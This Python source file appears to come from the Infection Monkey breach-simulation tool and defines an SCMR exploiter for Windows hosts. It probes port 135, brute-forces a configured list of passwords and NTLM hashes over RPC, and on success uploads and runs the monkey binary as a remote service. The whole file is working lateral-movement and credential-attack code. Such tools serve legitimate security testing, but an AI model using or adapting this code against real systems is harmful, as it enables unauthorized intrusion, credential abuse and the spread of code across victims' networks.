from logging import getLogger

from common.utils.exceptions import CredentialsError, FailedExploitationError
from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import (get_target_monkey)
from infection_monkey.exploit.tools.impacket_helpers.creds_dto import NtlmCreds
from infection_monkey.exploit.tools.impacket_helpers.scmr_exploit_api import ScmrApi
from infection_monkey.model.host_consts import OsType
from infection_monkey.network.tools import check_tcp_port

LOG = getLogger(__name__)


class ScmrExploiter(HostExploiter):
    _TARGET_OS_TYPE = ['windows']
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = 'RPC and SCMR'

    def __init__(self, host):
        super().__init__(host)
        self.vulnerable_port = None

    def is_os_supported(self):
        if super().is_os_supported():
            return True

        if not self.host.os.get('type'):
            if check_tcp_port(self.host.ip_addr, 135)[0]:
                # add windows os to host or else downloader won't know which monkey binary to download
                if not self.host.os:
                    self.host.os = {'type': OsType.windows}
                return True

        return False

    def _exploit_host(self):

        self.scmr_api = ScmrApi(self.host)

        src_path = get_target_monkey(self.host)

        if not src_path:
            LOG.info("Can't find suitable monkey executable for host %r", self.host)
            return False

        # Brute force to figure out which credentials are correct
        creds = self.get_credentials()

        # Upload and run monkey
        self.scmr_api.run_monkey(credentials=creds,
                                 dst_monkey_path=self._config.dropper_target_path_win_32,
                                 service_name=self._config.smb_service_name)

        return True

    def get_credentials(self) -> NtlmCreds:
        cred_lists = self._config.get_exploit_user_password_or_hash_product()

        for creds in cred_lists:
            ntlm_creds = NtlmCreds.build_from_list(creds)
            try:
                self.scmr_api.check_credentials(ntlm_creds)
                self._report_login_attempt(success=True, creds=ntlm_creds)
                return ntlm_creds
            except CredentialsError:
                self._report_login_attempt(success=False, creds=ntlm_creds)
                pass
        raise FailedExploitationError("No viable credentials found.")

    def _report_login_attempt(self, success: bool, creds: NtlmCreds):
        if success:
            log_message = "Successfully authenticated to %r using RPC (%s : (SHA-512) %s : (SHA-512) %s : (SHA-512) %s)"
        else:
            log_message = "Failed to authenticate to %r using RPC (%s : (SHA-512) %s : (SHA-512) %s : (SHA-512) %s)"
        LOG.debug(log_message,
                  self.host,
                  creds.username,
                  self._config.hash_sensitive_data(creds.password),
                  self._config.hash_sensitive_data(creds.lmhash),
                  self._config.hash_sensitive_data(creds.nthash))
        self.report_login_attempt(success,
                                  creds.username,
                                  creds.password,
                                  creds.lmhash,
                                  creds.nthash)
